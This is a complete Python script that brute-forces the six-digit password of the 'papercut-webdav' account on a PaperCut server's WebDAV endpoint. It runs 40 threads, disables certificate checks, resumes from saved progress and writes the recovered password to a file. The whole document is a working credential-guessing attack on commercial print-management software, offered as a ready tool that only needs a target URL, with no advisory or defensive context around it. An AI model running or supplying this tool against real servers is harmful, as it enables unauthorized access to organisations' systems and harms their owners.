import argparse
import requests
import base64
import os
import signal
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

# === CONFIG DEFAULTS ===
max_number = 1000000
chunk_size = 1000
threads = 40
completed_chunks_file = 'completed_chunks.txt'
found_password_file = 'found_password.txt'

requests.packages.urllib3.disable_warnings()

# === Globals ===
lock = threading.Lock()
stop_flag = threading.Event()
task_queue = Queue()
completed_chunks = set()
url = None  # to be set from argument

# === Load completed chunks from file ===
def load_completed_chunks():
    if os.path.exists(completed_chunks_file):
        with open(completed_chunks_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line.isdigit():
                    completed_chunks.add(int(line))

# === Save completed chunk to file ===
def save_completed_chunk(start):
    with lock:
        if start not in completed_chunks:
            with open(completed_chunks_file, 'a') as f:
                f.write(f"{start}\n")
            completed_chunks.add(start)

# === Save found password to file ===
def save_password(password):
    with open(found_password_file, 'w') as f:
        f.write(password + '\n')
        f.flush()
        os.fsync(f.fileno())
    print(f"[+] Password saved to {found_password_file}")

# === Generate task chunks ===
def generate_tasks():
    for start in range(0, max_number, chunk_size):
        if start not in completed_chunks:
            end = min(start + chunk_size, max_number)
            task_queue.put((start, end))

# === Password tester ===
def worker():
    while not task_queue.empty() and not stop_flag.is_set():
        try:
            start, end = task_queue.get_nowait()
        except:
            break
        print(f"[Thread {threading.get_ident()}] Processing {start}–{end}")
        for i in range(start, end):
            if stop_flag.is_set():
                break
            password = str(i).rjust(6, '0')
            auth_raw = f'papercut-webdav:{password}'
            auth_header = 'Basic ' + base64.b64encode(auth_raw.encode()).decode()
            try:
                r = requests.post(url, headers={'Authorization': auth_header}, verify=False, timeout=5)
                print(i, r.status_code)
                if r.status_code != 403:
                    print(f'[+] Got password! {password}')
                    save_password(password)
                    save_completed_chunk(start)
                    os._exit(0)  # Hard exit after saving password and chunk
            except requests.RequestException as e:
                print(f"[!] Request failed at {i}: {e}")
        save_completed_chunk(start)

# === Graceful exit ===
def signal_handler(sig, frame):
    print("\n[!] Caught Ctrl+C, stopping threads and saving state.")
    stop_flag.set()

signal.signal(signal.SIGINT, signal_handler)

# === Main ===
def main():
    global url

    parser = argparse.ArgumentParser(description='Password brute-force for PaperCut WebDAV (6 digit code).')
    parser.add_argument('-u', '--url', required=True, help='Base URL like https://x.x.x.x:9192')
    args = parser.parse_args()

    # Construct full URL
    url = args.url.rstrip('/') + '/webdav/hi'

    print(f"[+] Target URL: {url}")
    print("[+] Loading completed chunks...")
    load_completed_chunks()

    print("[+] Generating task queue...")
    generate_tasks()

    print(f"[+] Starting {threads} threads...")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(worker)

    print("[+] All threads completed.")

if __name__ == '__main__':
    main()
